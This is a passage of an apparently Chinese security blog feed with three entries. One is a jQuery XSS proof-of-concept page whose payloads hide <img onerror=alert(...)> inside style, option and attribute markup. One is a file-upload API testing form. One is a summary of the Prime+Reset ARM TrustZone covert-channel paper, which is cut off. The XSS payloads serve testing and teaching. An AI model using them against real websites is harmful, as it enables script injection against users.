class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;test(1)&quot;</span>&gt;</span>Assign to innerHTML<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;test(1,true)&quot;</span>&gt;</span>Append via .html()<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xmp</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;poc1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> /&gt;</span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(2)</span>&gt;</span> </span></span><br><span class="language-xml"><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">xmp</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-xml"> </span></span><br><span class="language-xml"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>PoC 2 (Only jQuery 3.x affected)<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;test(2)&quot;</span>&gt;</span>Assign to innerHTML<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;test(2,true)&quot;</span>&gt;</span>Append via .html()<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">xmp</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;poc2&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;&lt;x&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;/&gt;&lt;img src=x onerror=alert(&quot;</span><span class="hljs-attr">1st</span>&quot;)&gt;</span>&quot;&gt;</span></span><br><span class="language-xml"><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">xmp</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-xml"> </span></span><br><span class="language-xml"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>PoC 3<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;test(3)&quot;</span>&gt;</span>Assign to innerHTML<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;test(3,true)&quot;</span>&gt;</span>Append via .html()<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">xmp</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;poc3&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&quot;<span class="hljs-attr">1st</span>&quot;)&gt;</span></span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xmp</span>&gt;</span><br> <br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;div&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>攻防渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>API测试</tag>
      
      <tag>HTML模板</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>API接口测试之文件上传(RFC1867协议)HTMl模板</title>
    <link href="/2025/05/07/API%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-RFC1867%E5%8D%8F%E8%AE%AE-HTMl%E6%A8%A1%E6%9D%BF/"/>
    <url>/2025/05/07/API%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-RFC1867%E5%8D%8F%E8%AE%AE-HTMl%E6%A8%A1%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<p>通过构建一个 html 的文件上传模板进行文件上传对接口进行测试；</p><p>之前测试RFC1867协议的文件上传也是通过 html 进行文件上传模板进行测试，但是由于每次对不同的借口进行文件上传测试都需要打开一下文本编辑，然后在修改，真的很麻烦，所以就产生了以下的内容；</p><p>通过加入输入框输入接口 URL 和自定义请求头防止需要低权限认证的情况，基本解决了大部分的问题，还有小部分的问题就是RFC1867协议自定义 POST 数据的情况没有解决，且不是很好解决，还是得抓包进行修改才行。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/uPic/1746584406038-a2ee562e-c93a-4057-aef3-518b6e9ba41f.png" alt="img"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>文件上传demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-class">.container</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">max-width</span>: <span class="hljs-number">500px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">margin</span>: <span class="hljs-number">50px</span> auto;</span><br><span class="language-css">            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">10px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>);</span><br><span class="language-css">        &#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.form-group</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">15px</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">        <span class="hljs-selector-tag">label</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">display</span>: block;</span><br><span class="language-css">            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">5px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">font-weight</span>: bold;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">        <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">&quot;submit&quot;</span>]</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">background</span>: <span class="hljs-number">#007bff</span>;</span><br><span class="language-css">            <span class="hljs-attribute">color</span>: white;</span><br><span class="language-css">            <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span> <span class="hljs-number">24px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">border</span>: none;</span><br><span class="language-css">            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">cursor</span>: pointer;</span><br><span class="language-css">            <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">15px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">        <span class="hljs-comment">/* 统一输入框样式 */</span></span><br><span class="language-css">        <span class="hljs-selector-class">.form-control</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;</span><br><span class="language-css">            <span class="hljs-attribute">padding</span>: <span class="hljs-number">8px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;</span><br><span class="language-css">            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">box-sizing</span>: border-box;</span><br><span class="language-css">            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">5px</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">        <span class="hljs-selector-tag">textarea</span><span class="hljs-selector-class">.form-control</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">resize</span>: vertical;</span><br><span class="language-css">            <span class="hljs-attribute">font-family</span>: monospace;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">        <span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">::placeholder</span>,</span><br><span class="language-css">        <span class="hljs-selector-tag">textarea</span><span class="hljs-selector-pseudo">::placeholder</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">color</span>: <span class="hljs-number">#999</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>文件上传表单<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;uploadForm&quot;</span>&gt;</span><br>            <span class="hljs-comment">&lt;!-- API接口输入框 --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;apiUrl&quot;</span>&gt;</span>接口地址：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;apiUrl&quot;</span> </span><br><span class="hljs-tag">                       <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span></span><br><span class="hljs-tag">                       <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;请输入接口URL（示例：https://example.com/upload）&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <br>            <span class="hljs-comment">&lt;!-- 请求头输入框 --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;headers&quot;</span>&gt;</span>请求头：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;headers&quot;</span> </span><br><span class="hljs-tag">                          <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span></span><br><span class="hljs-tag">                          <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;每行一个请求头，格式：HeaderName: Value<span class="hljs-symbol">&amp;#10;</span>示例：<span class="hljs-symbol">&amp;#10;</span>Authorization: Bearer your_token<span class="hljs-symbol">&amp;#10;</span>Content-Type: multipart/form-data&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>            <span class="hljs-comment">&lt;!-- 文件选择 --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>选择文件：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> </span><br><span class="hljs-tag">                       <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span> </span><br><span class="hljs-tag">                       <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> </span><br><span class="hljs-tag">                       <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span></span><br><span class="hljs-tag">                       <span class="hljs-attr">required</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;上传文件&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;uploadForm&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;submit&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) &#123;</span><br><span class="language-javascript">            e.<span class="hljs-title function_">preventDefault</span>();</span><br><span class="language-javascript">            </span><br><span class="language-javascript">            <span class="hljs-comment">// 获取输入值</span></span><br><span class="language-javascript">            <span class="hljs-keyword">const</span> apiUrl = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;apiUrl&#x27;</span>).<span class="hljs-property">value</span>;</span><br><span class="language-javascript">            <span class="hljs-keyword">const</span> headersInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;headers&#x27;</span>).<span class="hljs-property">value</span>;</span><br><span class="language-javascript">            <span class="hljs-keyword">const</span> fileInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;file&#x27;</span>);</span><br><span class="language-javascript">            <span class="hljs-keyword">const</span> file = fileInput.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>];</span><br><span class="language-javascript">            </span><br><span class="language-javascript">            <span class="hljs-comment">// 基础验证</span></span><br><span class="language-javascript">            <span class="hljs-keyword">if</span> (!apiUrl) &#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;请输入接口地址&#x27;</span>);</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span>;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span> (!file) &#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;请选择要上传的文件&#x27;</span>);</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span>;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">            <span class="hljs-comment">// 解析请求头</span></span><br><span class="language-javascript">            <span class="hljs-keyword">const</span> headers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Headers</span>();</span><br><span class="language-javascript">            headersInput.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;\n&#x27;</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">line</span> =&gt;</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">const</span> [key, ...valueParts] = line.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;:&#x27;</span>);</span><br><span class="language-javascript">                <span class="hljs-keyword">if</span> (key &amp;&amp; valueParts.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">const</span> value = valueParts.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;:&#x27;</span>).<span class="hljs-title function_">trim</span>();</span><br><span class="language-javascript">                    headers.<span class="hljs-title function_">append</span>(key.<span class="hljs-title function_">trim</span>(), value);</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;);</span><br><span class="language-javascript"></span><br><span class="language-javascript">            <span class="hljs-comment">// 创建 FormData 对象</span></span><br><span class="language-javascript">            <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>();</span><br><span class="language-javascript">            formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;file&#x27;</span>, file);</span><br><span class="language-javascript"></span><br><span class="language-javascript">            <span class="hljs-comment">// 发送请求</span></span><br><span class="language-javascript">            <span class="hljs-title function_">fetch</span>(apiUrl, &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">headers</span>: headers,</span><br><span class="language-javascript">                <span class="hljs-attr">body</span>: formData</span><br><span class="language-javascript">            &#125;) </span><br><span class="language-javascript">            .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">text</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> &#123;</span><br><span class="language-javascript">                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`上传失败：<span class="hljs-subst">$&#123;response.status&#125;</span> - <span class="hljs-subst">$&#123;text&#125;</span>`</span>);</span><br><span class="language-javascript">                    &#125;);</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();</span><br><span class="language-javascript">            &#125;)</span><br><span class="language-javascript">            .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;上传成功&#x27;</span>);</span><br><span class="language-javascript">                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;响应数据:&#x27;</span>, data);</span><br><span class="language-javascript">            &#125;)</span><br><span class="language-javascript">            .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">alert</span>(error.<span class="hljs-property">message</span>);</span><br><span class="language-javascript">                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;错误详情:&#x27;</span>, error);</span><br><span class="language-javascript">            &#125;);</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>攻防渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>API测试</tag>
      
      <tag>HTML模板</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>(论文解读)Prime+Reset_ Introducing A Novel Cross-World  Covert-Channel Through Comprehensive Security  Analysis on ARM TrustZone</title>
    <link href="/2025/05/05/(%E8%AE%BA%E6%96%87%E8%A7%A3%E8%AF%BB)Prime+Reset_%20Introducing%20A%20Novel%20Cross-World%20%20Covert-Channel%20Through%20Comprehensive%20Security%20%20Analysis%20on%20ARM%20TrustZone/"/>
    <url>/2025/05/05/(%E8%AE%BA%E6%96%87%E8%A7%A3%E8%AF%BB)Prime+Reset_%20Introducing%20A%20Novel%20Cross-World%20%20Covert-Channel%20Through%20Comprehensive%20Security%20%20Analysis%20on%20ARM%20TrustZone/</url>
    
    <content type="html"><![CDATA[<h1 id="一、基础介绍"><a href="#一、基础介绍" class="headerlink" title="一、基础介绍"></a>一、基础介绍</h1><p>ARM TrustZone 是一种强大的安全机制，旨在通过将片上系统硬件和软件划分为两个不同的世界（即正常世界和安全世界）来防范各种威胁。然而，安全世界仍然容易受到恶意攻击，包括侧信道和隐蔽信道漏洞。</p><p>本文的主要工作是逆向了 L2 预取器并设计了一种新的跨内核和跨界的隐蔽信道攻击方法，成为 Prime+Reset。该跨界攻击与 其他的隐蔽信道攻击相比，Prime+Reset 是一种与缓存 PMU 无关的攻击，能够有效绕过许多现有的防御措施。</p><p>Prime+Reset的吞吐量可达到776 Kib&#x2F;s，比最先进的技术显著提高了70倍，同时还保持了类似的错误率（&lt; 2%）。</p><p>Source Code：<a href="https://github.com/yunchen-juuuump/prime-reset">https://github.com/yunchen-juuuump/prime-reset</a></p><blockquote><p><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);">PMU指的是</font><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);">性能监控单元（Performance Monitoring Unit）</font></strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);">。PMU是现代处理器中的一个硬件组件，用于监控和记录与处理器性能相关的微架构事件，例如缓存命中&#x2F;失效、指令执行周期、分支预测错误、内存访问延迟等。这些数据通常用于性能分析和优化，但也可被恶意利用，例如通过侧信道攻击或隐蔽信道攻击来推断敏感信息。</font></p></blockquote><h1 id="二、安全分析套件"><a href="#二、安全分析套件" class="headerlink" title="二、安全分析套件"></a>二、安全分析套件</h1><p>作者团队设计了一个自动识别潜在的硬件侧信道漏洞，从现有的侧信道和隐蔽信道攻击中汲取灵感。侧信道&#x2F;隐蔽信道攻击有两个基本标准：</p><ol><li>此类攻击需要并使用跨不同执行域的共享硬件资源来制造资源争用和检测变化（如高速缓存、BPU、发行单元和 TLB）</li><li>任何能够改变正常执行流程的微体系结构事件都会引入新的泄漏（如超序执行和预处理器）</li></ol><p>本文设计的安全分析套件通过<strong>检测是否存在硬件组件充当共享资源或在时空上改变执行流来评定是否存在相关问题。</strong></p><p>若存在相关问题在进一步深入分析，包括逆向工程和执行特征等等。</p><h2 id="2-1-实验环境"><a href="#2-1-实验环境" class="headerlink" title="2.1 实验环境"></a>2.1 实验环境</h2><ul><li>商用 ARM 硬件平台 HiKey960（采用麒麟 960 SoC [2]）</li></ul><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/uPic/1745656098451-a35c39e3-8301-4b27-8947-ddd16f500f23.png" alt="图1：Kirin 960的微体系结构。"></p><h2 id="2-2-安全基准套件分析"><a href="#2-2-安全基准套件分析" class="headerlink" title="2.2 安全基准套件分析"></a>2.2 安全基准套件分析</h2><p>作者通过使用基准套件分析拓展控制寄存器(ECTLR)，该寄存器同时管理内核和非内核系统。</p><p>通过作者的分析和 ARM CortexA 验证，我们发现 ARMv8 CortexA 乱序处理器系列中存在默认启用的 L2 步进预取器。鉴于 L2 预取器位于非核心内存系统中，而且以前的工作中没有对其进行详细记录，我们将其确定为新的潜在泄漏源，并通过逆向工程进行了深入分析。</p><h1 id="三、逆向分析-L2-预取器"><a href="#三、逆向分析-L2-预取器" class="headerlink" title="三、逆向分析 L2 预取器"></a>三、逆向分析 L2 预取器</h1><p>本章节探究 L2 stride 预取器的特征，首次解释索引、更新和触发机制。给予这些新发现的信息，进一步探索跨内核预取效果，并确定预取器的入口数量，从而构建跨内核和跨界的隐蔽信道攻击。</p><h2 id="3-1-L2-步进预取器触发"><a href="#3-1-L2-步进预取器触发" class="headerlink" title="3.1 L2 步进预取器触发"></a>3.1 L2 步进预取器触发</h2><p>作者为了准确确定触发预取的阈值，设计了一个微基准测试方法，具体实现如下图所示；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/uPic/1745656776653-902aaf55-857f-4d64-b23d-90c9ea5963e3.png" alt="List 1：用于检测L2预取中触发阈值的微学计算标准。"></p><blockquote><p>上述程序好像写错了一点，Time(men[step * stride]) &#x3D;&#x3D;&gt; Time(men[probe + step * 